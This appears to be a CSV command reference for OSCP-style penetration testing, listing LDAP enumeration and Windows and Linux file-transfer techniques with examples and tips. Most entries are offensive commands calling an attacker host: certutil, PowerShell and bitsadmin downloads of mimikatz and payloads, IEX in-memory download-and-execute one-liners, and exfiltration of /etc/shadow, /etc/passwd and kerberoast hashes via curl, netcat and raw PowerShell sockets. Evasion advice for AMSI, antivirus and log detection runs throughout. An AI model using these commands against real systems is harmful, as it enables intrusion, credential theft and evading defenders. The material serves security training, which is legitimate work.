"verify-ldap-anonymous-bind","Verify LDAP Anonymous Bind Allowed","utilities","ldapsearch -x -H ldap://<TARGET> -b """" -s base ""(objectClass=*)""","Check if LDAP server allows anonymous bind for unauthenticated enumeration","","ldapsearch -x -H ldap://192.168.1.100 -b """" -s base ""(objectClass=*)""","Anonymous LDAP bind often disabled in hardened environments.

If allowed, provides base DN for further enumeration.","high","","","","{""Anonymous bind disabled"": ""Use valid credentials: -D 'CN=User,DC=domain' -w password"", ""Connection error"": ""Verify LDAP port: nmap -p 389,636,3268,3269 <TARGET>"", ""LDAPS required"": ""ldapsearch -x -H ldaps://<TARGET>:636""}","{""-x"": ""Simple authentication (not SASL)"", ""-H ldap://<TARGET>"": ""LDAP URI to connect"", ""-b \""\"""": ""Base DN (empty for rootDSE query)"", ""-s base"": ""Search scope: base object only""}","","",""
"ft-certutil-download","Windows: certutil Download","file-transfer","certutil -urlcache -f http://<LHOST>:<PORT>/<FILE> <OUTPUT>","Download file on Windows using certutil (built-in, often bypasses restrictions)","windows-download","certutil -urlcache -f http://10.10.14.5:8000/nc.exe nc.exe","OSCP METHODOLOGY: First choice for Windows downloads. Certutil is a legitimate Windows certificate management tool, so it's often whitelisted by AV and application whitelisting solutions. Living-off-the-land binary (LOLBin).

MANUAL ALTERNATIVE: Copy/paste file contents if very small, or use ft-vbscript-download on ancient systems.

WHY IT WORKS: Windows admins rarely block certutil because it's used for legitimate certificate operations. Defenders often miss it in logs.

EXAM TIP: If initial shell is cmd.exe, this is your fastest download method. Test immediately after getting shell. Can also encode/decode Base64: certutil -encode in.exe out.txt && certutil -decode out.txt restored.exe

COMMON GOTCHA: Leaves cache artifacts in C:\Users\<USER>\AppData\LocalLow\Microsoft\CryptnetUrlCache

TIME ESTIMATE: 2-10 seconds for typical tools (100KB-10MB). Faster than PowerShell for small files.","high","","","","{""File downloaded but certutil shows error"": ""Check if file exists anyway: dir <OUTPUT>. Sometimes reports error but file transferred successfully"", ""Access is denied"": ""Try different output location: C:\\Windows\\Tasks\\<OUTPUT> or C:\\Users\\Public\\<OUTPUT>"", ""AV flagged certutil"": ""Use alternative: ft-powershell-webclient or ft-bitsadmin-download"", ""Cannot resolve hostname"": ""Use IP address instead of hostname in URL"", ""Large file fails"": ""Use -split flag or switch to ft-smb-download for files >100MB""}","{""-urlcache"": ""Use URL cache function - actually just downloads the file, the 'cache' aspect is a quirk of certutil's certificate management tool being repurposed for downloads"", ""-f"": ""Force fetch - overwrites existing cached entry or file. Without this, download may fail if file exists"", ""-split"": ""Alternative to -urlcache -f for large files - splits download into chunks. Useful for files >10MB"", ""http://"": ""Supports both HTTP and HTTPS URLs - for HTTPS without valid cert, it may still work (less strict than PowerShell)""}","[""ft-python-http-server""]","[""ft-powershell-iwr"", ""ft-powershell-webclient"", ""ft-bitsadmin-download""]","[""ft-base64-encode"", ""ft-smb-download""]"
"ft-powershell-iwr","Windows: PowerShell Invoke-WebRequest","file-transfer","powershell -ep bypass -c ""Invoke-WebRequest -Uri http://<LHOST>:<PORT>/<FILE> -OutFile <OUTPUT>""","Download file using PowerShell Invoke-WebRequest (modern, verbose progress)","windows-download","powershell -ep bypass -c ""Invoke-WebRequest -Uri http://10.10.14.5:8000/winPEAS.exe -OutFile C:\Temp\winPEAS.exe""","OSCP METHODOLOGY: Second choice for Windows downloads after certutil. More modern and flexible, but can be slower and more detectable. Alias IWR can be used in PowerShell prompt: IWR http://<IP>/<FILE> -OutFile <FILE>

MANUAL ALTERNATIVE: Use browser if RDP available, but that's rarely the case in OSCP shells.

WHY -ep bypass: Most Windows servers have Restricted execution policy preventing script execution. This bypasses it for this session only (non-persistent).

EXAM TIP: If you get 'Internet Explorer not initialized' error, add -UseBasicParsing. For in-memory execution without touching disk: IEX(IWR http://<IP>/script.ps1 -UseBasicParsing)

VS WEBCLIENT: Invoke-WebRequest shows progress and is more PowerShell-native, but WebClient.DownloadFile() is faster for large files.

TIME ESTIMATE: 5-20 seconds for typical tools, slower than certutil due to PowerShell overhead.","high","","","","{""Internet Explorer engine error"": ""Add -UseBasicParsing flag: IWR -Uri <URL> -OutFile <FILE> -UseBasicParsing"", ""AMSI detection"": ""Use obfuscation or alternative: ft-certutil-download"", ""Execution policy blocked"": ""Ensure -ep bypass is first flag to powershell.exe"", ""SSL/TLS error on HTTPS"": ""Add: -SkipCertificateCheck (PowerShell 6+) or use HTTP instead"", ""Progress bar freezes"": ""Add -UseBasicParsing to disable progress indicators""}","{""-ep bypass"": ""Execution policy bypass - allows scripts to run even if execution policy is Restricted. Required for most OSCP targets"", ""-c"": ""Execute command - runs the following PowerShell code as a one-liner"", ""Invoke-WebRequest"": ""PowerShell cmdlet for HTTP operations - more feature-rich than WebClient but slower for simple downloads"", ""-Uri"": ""URL parameter - can be HTTP or HTTPS, supports redirects"", ""-OutFile"": ""Output file path - where to save downloaded content"", ""-UseBasicParsing"": ""Skip IE engine dependency - use if Invoke-WebRequest fails with 'Internet Explorer not initialized' error""}","[""ft-python-http-server""]","[""ft-certutil-download"", ""ft-powershell-webclient""]","[""ft-powershell-upload""]"
"ft-powershell-webclient","Windows: PowerShell WebClient Download","file-transfer","powershell -ep bypass -c ""(New-Object System.Net.WebClient).DownloadFile('http://<LHOST>:<PORT>/<FILE>','<OUTPUT>')""","Download file using .NET WebClient class (faster than Invoke-WebRequest)","windows-download","powershell -ep bypass -c ""(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.5:8000/mimikatz.exe','C:\Windows\Temp\mimikatz.exe')""","OSCP METHODOLOGY: Fastest PowerShell download method for large files (>10MB). Uses .NET directly instead of PowerShell cmdlets, reducing overhead. No progress indicator - silent execution.

MANUAL ALTERNATIVE: Could use WinHTTP or BITS COM objects, but WebClient is simplest.

IN-MEMORY VARIANT: For in-memory execution without touching disk: IEX(New-Object Net.WebClient).DownloadString('http://<IP>/script.ps1')

EXAM TIP: Use this for large payloads (Mimikatz, Rubeus, etc.) where speed matters. Remember the filename in output path - easy to forget and get errors.

VS INVOKE-WEBREQUEST: WebClient is 2-5x faster for files >10MB, no IE dependency, but less features (no -UseBasicParsing issues).

TIME ESTIMATE: 2-5 seconds for tools under 5MB, faster than IWR and comparable to certutil.","high","","","","{""No output but file missing"": ""Check output path is valid directory: Test-Path C:\\Windows\\Temp"", ""SSL/TLS error"": ""Disable cert validation: [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; then run download"", ""Access denied writing file"": ""Try different directory: C:\\Users\\Public\\, C:\\Windows\\Tasks\\, C:\\ProgramData\\"", ""Proxy blocking connection"": ""Set proxy: $wc = New-Object System.Net.WebClient; $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials""}","{""New-Object System.Net.WebClient"": ""Instantiate .NET WebClient class - provides HTTP download capabilities without PowerShell cmdlet overhead"", ""DownloadFile()"": ""Synchronous download method - blocks until complete, faster than Invoke-WebRequest for large files"", ""Single quotes"": ""Required around URLs to prevent PowerShell variable expansion if URL contains $ or other special chars"", ""Full output path"": ""Must include directory AND filename - will not infer filename from URL like Invoke-WebRequest""}","[""ft-python-http-server""]","[""ft-powershell-iwr"", ""ft-certutil-download""]",""
"ft-smb-download","Windows: SMB Copy from Share","file-transfer","copy \\<LHOST>\<SHARE>\<FILE> <DEST>","Copy file from Kali SMB share to Windows target (fastest for large files)","windows-download","copy \\10.10.14.5\share\nc.exe C:\Temp\nc.exe","OSCP METHODOLOGY: Fastest transfer method for Windows targets on internal network. 10-100x faster than HTTP for large files (>10MB). Port 445 often allowed internally even when HTTP egress is blocked.

MANUAL ALTERNATIVE: Mount share persistent: net use Z: \\<IP>\share then access as Z:\ drive.

DIRECT EXECUTION: Can run tools directly from share without copying: \\<IP>\share\winPEAS.exe > output.txt (saves disk space, leaves less artifacts)

EXAM TIP: If HTTP download fails or is slow, immediately try SMB. On newer Windows (10+), you'll need authenticated SMB - setup with -username/-password flags on impacket-smbserver.

SECURITY EVASION: SMB transfers are harder to detect in logs than HTTP downloads (blends with normal network file sharing).

TIME ESTIMATE: Near-instant for files under 50MB on local network, limited only by network speed.","high","","","","{""Network path not found"": ""Verify SMB server running: sudo netstat -antp | grep 445. Check share name matches"", ""Access denied on Windows 10+"": ""Use authenticated SMB: On Kali add -username user -password pass. On Windows: net use \\\\<IP>\\share /user:user pass"", ""Port 445 blocked"": ""Check firewall: Test-NetConnection <IP> -Port 445, or use alternative: ft-certutil-download"", ""Direct execution fails"": ""Can execute directly from share without copying: \\\\<IP>\\share\\tool.exe"", ""Authentication keeps prompting"": ""Clear cached creds: net use \\\\<IP>\\share /delete, then reconnect with correct creds""}","{""\\\\\\\\<LHOST>\\\\<SHARE>"": ""UNC path format - standard Windows network path to access SMB shares"", ""copy"": ""Native Windows command - can also use xcopy /y for overwrite without prompt, or robocopy for advanced options"", ""/y"": ""Optional flag to suppress overwrite confirmation prompt - useful in scripts: copy /y source dest""}","[""ft-smb-server""]","[""ft-certutil-download"", ""ft-powershell-webclient""]",""
"ft-bitsadmin-download","Windows: bitsadmin Download","file-transfer","bitsadmin /transfer <JOB_NAME> /download /priority high http://<LHOST>:<PORT>/<FILE> <OUTPUT>","Download file using Windows BITS service (background transfer, stealthier)","windows-download","bitsadmin /transfer myDownload /download /priority high http://10.10.14.5:8000/payload.exe C:\Windows\Temp\payload.exe","OSCP METHODOLOGY: Third choice for Windows downloads when certutil and PowerShell are blocked or monitored. Uses Windows Background Intelligent Transfer Service (BITS) - designed for downloading Windows Updates, so often whitelisted.

MANUAL ALTERNATIVE: Could use GUI Component Services to create BITS job, but command line is faster.

STEALTH BENEFITS: BITS transfers blend with Windows Update traffic. Uses /priority low for stealthy background transfers that throttle when network busy.

EXAM TIP: Slower than certutil/PowerShell for small files but more reliable for large files (auto-resumes on connection loss). Can be detected by EDR monitoring BITS jobs.

LIMITATIONS: Requires BITS service running (enabled by default). Must use absolute paths for OUTPUT.

TIME ESTIMATE: 10-30 seconds for typical tools (slower due to BITS overhead), but reliable for files >50MB.","medium","","","","{""Transfer job failed"": ""Check BITS service running: sc query bits, start if needed: net start bits"", ""Access denied"": ""Try different output directory: C:\\Users\\Public\\, C:\\ProgramData\\"", ""Slow or stalled transfer"": ""Cancel job: bitsadmin /cancel <JOB_NAME>, then retry with /priority high"", ""Job stuck in queue"": ""List all jobs: bitsadmin /list /verbose, cancel stuck job, retry"", ""Cannot add file error"": ""Ensure OUTPUT is absolute path, not relative""}","{""/transfer"": ""Create and execute transfer job in one command - simpler than /create + /addfile + /resume workflow"", ""/download"": ""Transfer mode - specifies download direction (vs /upload for uploads)"", ""/priority"": ""Job priority - high/normal/low. Use high for interactive transfers, low for stealthy background transfers"", ""<JOB_NAME>"": ""Job identifier - used for tracking transfer status. Can list all jobs: bitsadmin /list"", ""Absolute path required"": ""OUTPUT must be full path like C:\\file.exe, not relative like file.exe""}","[""ft-python-http-server""]","[""ft-certutil-download"", ""ft-powershell-webclient""]",""
"ft-powershell-upload","Windows: PowerShell Upload File","file-transfer","powershell -ep bypass -c ""Invoke-RestMethod -Uri http://<LHOST>:<PORT>/upload -Method Post -InFile '<FILE>'""","Upload file from Windows target to uploadserver (exfiltration)","upload","powershell -ep bypass -c ""Invoke-RestMethod -Uri http://10.10.14.5:80/upload -Method Post -InFile 'C:\Users\user\Desktop\proof.txt'""","OSCP METHODOLOGY: Primary exfiltration method for Windows targets. Clean, fast, uses HTTPS-capable PowerShell. Ideal for proof.txt, database dumps, or any files under 100MB.

MANUAL ALTERNATIVE: Could manually encode file as base64 and copy/paste, but direct upload is faster and cleaner.

EXAM TIP: Start uploadserver on Kali BEFORE running this command. Files save to directory where uploadserver started - cd to organized location first. Verify upload success: ls -lh and md5sum on Kali.

COMMON TARGETS: proof.txt, local.txt, SAM/SYSTEM hives, Secretsdump.py output, screenshots, database files.

VS SMB UPLOAD: PowerShell upload works over HTTP (port 80/443) which often passes egress filters better than SMB (port 445). SMB is faster for large files.

TIME ESTIMATE: 2-10 seconds for typical proof files (<1MB), longer for large files (database dumps, memory dumps).","high","","","","{""Connection refused"": ""Ensure uploadserver running: python3 -m uploadserver <PORT>"", ""404 error"": ""URL must end with /upload: http://<IP>:<PORT>/upload"", ""AMSI blocked script"": ""Obfuscate or use alternative: ft-smb-upload or ft-nc-send"", ""Large file times out"": ""Uploadserver supports large files, but check network stability. For files >100MB use ft-smb-upload"", ""File path error"": ""Use full paths with quotes: -InFile 'C:\\Users\\user\\file.txt'""}","{""Invoke-RestMethod"": ""PowerShell cmdlet for REST API operations - simpler than Invoke-WebRequest for POST uploads"", ""-Uri"": ""Target URL - must include /upload endpoint for uploadserver"", ""-Method Post"": ""HTTP method - required for file uploads"", ""-InFile"": ""Input file path - file to upload from target system"", ""Single quotes around path"": ""Required if path contains spaces or special characters""}","[""ft-uploadserver""]","[""ft-smb-upload"", ""ft-nc-send"", ""exfil-powershell-base64""]","[""ft-file-verify-md5""]"
"ft-smb-upload","Windows: Upload to SMB Share","file-transfer","copy ""<FILE>"" \\<LHOST>\<SHARE>\","Upload file from Windows target to Kali SMB share (fastest for large files)","upload","copy ""C:\Users\user\Desktop\data.zip"" \\10.10.14.5\share\","OSCP METHODOLOGY: Fastest exfiltration method for large files (>10MB) from Windows targets. 10-100x faster than HTTP for database dumps, memory dumps, or archives. Works well on internal networks where port 445 allowed.

MANUAL ALTERNATIVE: Mount as persistent drive: net use Z: \\<IP>\share then copy files to Z:\ drive.

EXAM TIP: If uploading multiple files, use wildcards: copy C:\loot\*.* \\<IP>\share\ to transfer entire directory. For newer Windows (10+), expect to need authentication - setup SMB server with -username/-password flags.

SECURITY EVASION: SMB file copies blend with normal network file sharing traffic, harder to detect than HTTP uploads.

VS HTTP UPLOAD: SMB is much faster for large files but requires port 445. HTTP upload works through more restrictive firewalls (port 80/443).

TIME ESTIMATE: Limited only by network speed - can transfer multi-GB files in minutes on local network.","high","","","","{""Network path not found"": ""Verify SMB server running on Kali: sudo netstat -antp | grep 445"", ""Access denied on Windows 10+"": ""Use authenticated SMB server: impacket-smbserver share . -smb2support -username user -password pass. Then: net use \\\\<IP>\\share /user:user pass"", ""Port 445 blocked by firewall"": ""Check connectivity: Test-NetConnection <IP> -Port 445. Use alternative: ft-powershell-upload"", ""File too large"": ""SMB handles large files well (multi-GB). If failing, check disk space on Kali: df -h"", ""Authentication prompts repeatedly"": ""Clear cached credentials: net use \\\\<IP>\\share /delete, then reconnect""}","{""copy"": ""Native Windows command - also supports wildcards: copy C:\\*.txt \\\\<IP>\\share\\"", ""Quotes around path"": ""Required if filename/path contains spaces"", ""/y"": ""Optional - suppress overwrite confirmation: copy /y source dest"", ""Trailing backslash"": ""Important - indicates destination is directory, not filename""}","[""ft-smb-server""]","[""ft-powershell-upload"", ""ft-nc-send""]",""
"ft-curl-upload","Linux: Curl Upload File","file-transfer","curl -X POST -F file=@<FILE> http://<LHOST>:<PORT>/upload","Upload file from Linux target to uploadserver (exfiltration)","upload","curl -X POST -F file=@/etc/shadow http://10.10.14.5:80/upload","OSCP METHODOLOGY: Primary exfiltration method for Linux targets. Clean, fast, uses HTTP which typically passes egress filters. Ideal for proof.txt, /etc/shadow, database dumps, or any sensitive files.

MANUAL ALTERNATIVE: Could use base64 encoding and copy/paste for small files, but direct upload is cleaner and works for binary files.

ALTERNATIVE UPLOAD: curl --upload-file <FILE> http://<IP>:<PORT>/ (PUT method, may not work with uploadserver)

EXAM TIP: Start uploadserver on Kali BEFORE running this command. Files save to directory where uploadserver started - cd to organized location first (/root/loot/<TARGET>/). Verify upload: ls -lh and md5sum.

COMMON TARGETS: proof.txt, /etc/passwd, /etc/shadow, .ssh/id_rsa, database dumps, config files with credentials.

PROGRESS INDICATION: Add -# for progress bar on large files: curl -# -X POST -F file=@largefile.zip http://...

TIME ESTIMATE: 2-5 seconds for typical files (<5MB), longer for large database/memory dumps.","high","","","","{""Connection refused"": ""Ensure uploadserver running on Kali: python3 -m uploadserver <PORT>"", ""404 error"": ""URL must include /upload endpoint: http://<IP>:<PORT>/upload"", ""Large file fails"": ""Uploadserver supports large files by default. Check network stability and disk space on Kali: df -h"", ""Permission denied reading file"": ""Check file permissions: ls -la <FILE>. If root-owned, use sudo: sudo curl..."", ""curl not found"": ""Use alternative: ft-nc-send or ft-base64-encode""}","{""-X POST"": ""HTTP method - specify POST for file uploads (required for uploadserver /upload endpoint)"", ""-F file=@<PATH>"": ""Form upload - reads file content and sends as multipart/form-data. @ prefix reads from file"", ""@"": ""Read from file - without @, curl would send literal filename string instead of file contents"", ""-#"": ""Progress bar - cleaner output than default verbose progress, useful for large files: curl -# -X POST..."", ""-k"": ""Allow insecure SSL - use if uploadserver on HTTPS with self-signed cert""}","[""ft-uploadserver""]","[""ft-nc-send"", ""ft-scp-upload""]",""
"ft-nc-receive","Netcat: Receive File","file-transfer","nc -lvnp <LPORT> > <OUTPUT>","Receive file using netcat listener (attacker receives from target)","netcat","nc -lvnp 4444 > received_file.txt","OSCP METHODOLOGY: Simple, universal file exfiltration. Works when HTTP/SMB are blocked. No server setup required beyond nc. Useful for quick one-off transfers.

MANUAL ALTERNATIVE: Python socket server, but nc is simpler and almost always available.

TARGET COMMAND: From target to send file: nc <LHOST> <LPORT> < file_to_exfil.txt (Linux) or type file.txt | nc <LHOST> <LPORT> (Windows)

EXAM TIP: Start listener BEFORE sending command to target. Connection is one-shot - closes after transfer. For multiple files, restart listener each time. Monitor file size in real-time: watch -n1 ls -lh <OUTPUT>

BINARY FILES: Works perfectly for binary files (executables, images, archives) - netcat is protocol-agnostic.

NO PROGRESS: No transfer progress - you won't know when complete until connection closes. For large files, check output size periodically.

TIME ESTIMATE: Limited by network bandwidth, typically 1-10MB/sec on local network.","high","","","","{""Port already in use"": ""Choose different port or find process: sudo lsof -i :<PORT>"", ""No connection from target"": ""Check firewall allows inbound on port, verify target can reach: nc -zv <LHOST> <PORT> from target"", ""Transfer incomplete"": ""File cut off early. Ensure target sends EOF or closes connection: nc <IP> <PORT> < file on target side"", ""Binary file corrupted"": ""Check file hash matches: md5sum <OUTPUT>. Netcat is transparent for binary"", ""Connection hangs"": ""Target still sending or connection not closed. Kill with Ctrl+C, file likely complete""}","{""-l"": ""Listen mode - nc becomes server waiting for incoming connection"", ""-v"": ""Verbose - show connection details and progress"", ""-n"": ""No DNS resolution - use IP addresses only, faster connection"", ""-p"": ""Port - specify listening port (some nc versions don't require -p, just nc -lv <PORT>)"", "">"": ""Redirect stdout to file - saves all received data to specified file""}","","[""ft-uploadserver"", ""ft-smb-server""]","[""ft-nc-send"", ""ft-file-verify-md5""]"
"ft-nc-send","Netcat: Send File","file-transfer","nc <LHOST> <LPORT> < <FILE>","Send file from target to netcat listener on attack machine","netcat","nc 10.10.14.5 4444 < /etc/passwd","OSCP METHODOLOGY: Simple, universal file exfiltration when HTTP/SMB unavailable. Works with just netcat - no web server required. Perfect for quick one-off transfers or restricted environments.

MANUAL ALTERNATIVE: Could use telnet or /dev/tcp, but nc is most common.

LISTENER COMMAND: On Kali, start receiver FIRST: nc -lvnp <PORT> > received_file.txt

EXAM TIP: Ensure listener running before sending file. Connection is one-shot - closes after transfer. For multiple files, restart listener each time. Verify integrity with md5sum on both sides.

WINDOWS POWERSHELL: PowerShell does NOT support < redirection. Use piping instead:
- Get-Content file.txt | nc.exe <IP> <PORT>
- type file.txt | nc.exe <IP> <PORT> (shorter)
- cmd /c ""nc.exe <IP> <PORT> < file.txt"" (runs in cmd.exe)

WINDOWS CMD.EXE: Supports < redirection directly: nc.exe <IP> <PORT> < file.txt

BINARY FILES: Works perfectly for binary files - netcat is protocol-agnostic. Use same command for executables, images, archives.

NO PROGRESS: No transfer progress indicator - you won't know when complete. Check listener output for file growth.

TIME ESTIMATE: Limited by network bandwidth, typically 1-10MB/sec on local network. Near-instant for small text files.","high","","","","{""Connection refused"": ""Ensure listener running on Kali: nc -lvnp <PORT> > output_file"", ""nc not found"": ""Use alternative: ft-bash-dev-tcp or ft-curl-upload"", ""File incomplete on receiver"": ""Use -w timeout: nc -w 3 <IP> <PORT> < file to ensure clean close"", ""Permission denied reading file"": ""Check file permissions: ls -la <FILE>. If root-owned, use sudo: sudo nc..."", ""Listener not receiving data"": ""Check firewall allows inbound on Kali, verify port: sudo netstat -antp | grep <PORT>"", ""PowerShell < operator error"": ""PowerShell doesn't support < redirection. Use: Get-Content file | nc <IP> <PORT> OR type file | nc <IP> <PORT> OR cmd /c \""nc <IP> <PORT> < file\""""}","{""<"": ""Input redirection - reads file content and sends through netcat connection"", ""-w 1"": ""Optional timeout - close connection 1 second after EOF (ensures clean disconnect): nc -w 1 <IP> <PORT> < file"", ""-v"": ""Verbose - show connection status (optional): nc -v <IP> <PORT> < file"", ""-n"": ""No DNS - use IP only, faster: nc -n <IP> <PORT> < file""}","[""ft-nc-receive""]","[""ft-curl-upload"", ""ft-bash-dev-tcp""]","[""ft-file-verify-md5""]"
"ft-powershell-tcp-send","PowerShell: Pure TCP Send File","file-transfer","$client = New-Object System.Net.Sockets.TcpClient(""<LHOST>"", <LPORT>); $stream = $client.GetStream(); $writer = New-Object System.IO.StreamWriter($stream); Get-Content <FILE> | ForEach-Object { $writer.WriteLine($_) }; $writer.Flush(); $client.Close()","Send file via pure PowerShell TCP socket (no external tools, works when nc.exe unavailable)","netcat","$client = New-Object System.Net.Sockets.TcpClient(""10.10.14.5"", 4444); $stream = $client.GetStream(); $writer = New-Object System.IO.StreamWriter($stream); Get-Content .\hashes.kerberoast | ForEach-Object { $writer.WriteLine($_) }; $writer.Flush(); $client.Close()","OSCP METHODOLOGY: Use when nc.exe is not available on Windows target but PowerShell is accessible. Pure PowerShell solution - no external binaries needed. Works in constrained environments where only PowerShell is allowed.

WHEN TO USE:
- nc.exe not on target system
- Execution policy blocks downloading nc.exe
- AV/EDR blocks netcat binaries
- Need living-off-the-land approach

LISTENER COMMAND: On Kali: nc -lvnp <PORT> > received_file.txt

TEXT FILES ONLY: This method uses WriteLine() which is designed for text. For binary files (executables, images, zip files), use ft-powershell-upload (HTTP POST) or ft-smb-upload instead.

EXAM TIP: Start listener BEFORE running PowerShell command. Can paste entire one-liner into PowerShell prompt. For multi-line version (easier to read/debug), separate commands with semicolons or newlines.

MULTI-LINE VERSION:
$client = New-Object System.Net.Sockets.TcpClient(""<LHOST>"", <LPORT>)
$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
Get-Content <FILE> | ForEach-Object { $writer.WriteLine($_) }
$writer.Flush()
$client.Close()

VS NETCAT: No external dependencies, but text-only. Use nc.exe if available for binary support.

VS HTTP UPLOAD: TCP is simpler (just listener needed), but HTTP upload (ft-powershell-upload) works better for binary files and large transfers.

STEALTH: Pure PowerShell TCP - no suspicious binary execution. Blends with normal PowerShell activity.

TIME ESTIMATE: 5-30 seconds for typical text files (<5MB). Slower than nc.exe due to PowerShell overhead.","medium","","","","{""Connection refused"": ""Ensure listener running on Kali: nc -lvnp <PORT> > output_file"", ""Cannot find path"": ""Use full path or .\\relative\\path for current directory files. Check: Test-Path <FILE>"", ""Binary file corrupted"": ""This method is for TEXT files only. For binary files, use ft-powershell-upload or ft-smb-upload instead"", ""Encoding issues"": ""Non-ASCII characters may corrupt. Use [System.Text.Encoding]::UTF8 for encoding control"", ""Large file hangs"": ""For files >10MB, consider chunked transfer or alternative method like ft-powershell-upload""}","{""New-Object System.Net.Sockets.TcpClient"": ""Creates TCP client object - native PowerShell, no external dependencies. Opens connection to specified IP:port"", ""GetStream()"": ""Gets network stream from TCP connection - provides read/write capabilities"", ""New-Object System.IO.StreamWriter"": ""Creates text writer for sending data - handles line-by-line writing efficiently"", ""Get-Content"": ""Reads file content line-by-line - PowerShell native cmdlet, works with text files"", ""ForEach-Object { $writer.WriteLine($_) }"": ""Writes each line to TCP stream - $_ represents current line in pipeline"", ""$writer.Flush()"": ""Forces buffered data to send immediately - ensures all data transmitted before closing"", ""$client.Close()"": ""Closes TCP connection cleanly - signals end of transmission to receiver""}","[""ft-nc-receive""]","[""ft-nc-send"", ""ft-powershell-upload"", ""ft-smb-upload""]","[""ft-file-verify-md5""]"
"ft-file-verify-md5","Verify File Transfer with MD5 Hash","file-transfer","md5sum <FILE>","Calculate MD5 hash of transferred file to verify integrity. Compare with original hash from Kali to ensure successful transfer. ALWAYS verify after file transfer to avoid corrupted payloads.","verification","md5sum LinEnum.sh","ALWAYS VERIFY after file transfer. OSCP WORKFLOW: (1) Calculate hash on Kali: md5sum /opt/tools/LinEnum.sh, (2) Transfer file to target, (3) Calculate hash on target: md5sum LinEnum.sh, (4) Compare hashes - must match exactly. COMMON CORRUPTION CAUSES: FTP text mode for binary files, incomplete wget (connection interrupted), copy/paste corruption (terminal encoding issues). Time estimate: <1 second per file. EXAM TIP: Create quick verification script: for f in *.exe; do echo ""$f:""; md5sum ""$f""; done

MANUAL ALTERNATIVES:

Linux MD5 verification:
md5sum <FILE>
# Compare output with original: md5sum /opt/tools/<FILE>

Windows PowerShell verification:
Get-FileHash -Algorithm MD5 <FILE> | Select-Object -ExpandProperty Hash
# Compare with: Get-FileHash -Algorithm MD5 \\<KALI>\share\<FILE>

Windows certutil verification:
certutil -hashfile <FILE> MD5
# Output includes extra text - ignore CertUtil header/footer

Batch verify multiple files (Linux):
md5sum exploit.sh nc.exe LinEnum.sh > hashes.txt
# On Kali, create matching file:
md5sum /opt/tools/exploit.sh /opt/tools/nc.exe /opt/tools/LinEnum.sh > original_hashes.txt
# Compare: diff hashes.txt original_hashes.txt (no output = perfect match)

SHA-256 (more secure, slower):
sha256sum <FILE>
# Use when MD5 collision attacks are concern (rare in OSCP)

Quick file size check (faster than hash):
ls -lh <FILE> (Linux)
dir <FILE> (Windows)
# Compare size with original - not foolproof but catches most corruption

Automate verification:
#!/bin/bash
# verify.sh - Compare file against known hash
FILE=$1
EXPECTED_HASH=$2
ACTUAL_HASH=$(md5sum ""$FILE"" | cut -d' ' -f1)
if [ ""$ACTUAL_HASH"" = ""$EXPECTED_HASH"" ]; then
    echo ""[+] $FILE: VERIFIED""
else
    echo ""[-] $FILE: CORRUPTED (expected $EXPECTED_HASH, got $ACTUAL_HASH)""
    exit 1
fi

USAGE:
./verify.sh LinEnum.sh 5d41402abc4b2a76b9719d911017c592

CORRUPTION TROUBLESHOOTING:

Binary file transferred in text mode:
# Symptoms: Hash mismatch, executable fails with ""cannot execute binary file""
# Solution: Use binary mode transfer
wget --content-disposition http://<LHOST>/nc.exe (HTTP auto-detects)
smbget -U '' smb://<LHOST>/share/nc.exe (SMB always binary)
ftp> binary; get nc.exe (FTP manual binary mode)

Line ending corruption (scripts):
# Symptoms: Hash mismatch on .sh/.py files, ""^M"" characters, ""bad interpreter""
# Solution: Convert line endings
dos2unix exploit.sh (Linux)
 sed -i 's/\r$//' exploit.sh (alternative)

Incomplete transfer:
# Symptoms: File size smaller than original, hash mismatch
# Solution: Check file size first
ls -lh <FILE> (should match original exactly)
# If smaller, re-download

Encoding corruption (copy/paste):
# Symptoms: Text files work but binaries fail
# Solution: NEVER copy/paste binary files - use proper transfer method

WHEN TO USE EACH HASH:
MD5: Fast, sufficient for OSCP transfer verification
SHA-1: Medium speed, more secure than MD5
SHA-256: Slower, most secure, use for critical payloads

TIME ESTIMATE:
MD5 calculation: <1 second for files <100MB
SHA-256: 2-3x slower than MD5
File size check only: <0.1 second (quick but less reliable)","high","","","","{""Hash mismatch (corruption detected)"": ""File corrupted during transfer. Solution: (1) Delete corrupted file: rm <FILE>, (2) Re-transfer using different method (try SMB if HTTP failed, or vice versa), (3) Verify Kali source file not corrupted: md5sum /opt/tools/<FILE>. Common causes: Text mode transfer for binary files, incomplete transfer (connection dropped), encoding issues (Windows CRLF vs Linux LF)."", ""No such file or directory"": ""File path wrong or transfer failed silently. Solution: List files: ls -la (Linux) or dir (Windows). Check current directory: pwd (Linux) or cd (Windows). Verify upload completed: check file size matches original."", ""Permission denied"": ""Cannot read file. Solution: Check permissions: ls -l <FILE>. If owned by root: sudo md5sum <FILE>. Or change permissions: chmod 644 <FILE>."", ""md5sum command not found (rare on Linux)"": ""md5sum missing (unusual - part of coreutils). Alternative: sha256sum <FILE> (compare with sha256sum on Kali). Or install: apt install coreutils."", ""Windows: Get-FileHash not available (old PowerShell)"": ""Use certutil instead: certutil -hashfile <FILE> MD5. Or upload md5.exe: copy \\\\<LHOST>\\share\\md5.exe . && md5.exe <FILE>""}","{""md5sum"": ""Calculate MD5 (Message Digest 5) hash of file contents. Produces 32-character hexadecimal fingerprint. Same file = same MD5. Even 1-byte difference = completely different hash. CRITICAL FOR OSCP: Verify exploits/scripts transferred correctly before execution. Corrupted binaries waste precious exam time with cryptic errors."", ""Windows equivalent"": ""Get-FileHash -Algorithm MD5 <FILE> | Select-Object -ExpandProperty Hash (PowerShell). Or certutil -hashfile <FILE> MD5 (older Windows). Both produce same 32-hex MD5 as Linux md5sum."", ""<FILE>"": ""File to verify. Can be absolute or relative path. Examples: ./exploit.sh, /tmp/nc.exe, C:\\Windows\\Temp\\payload.exe""}","[""ft-certutil-download"", ""ft-powershell-iwr"", ""ft-smb-download""]","",""
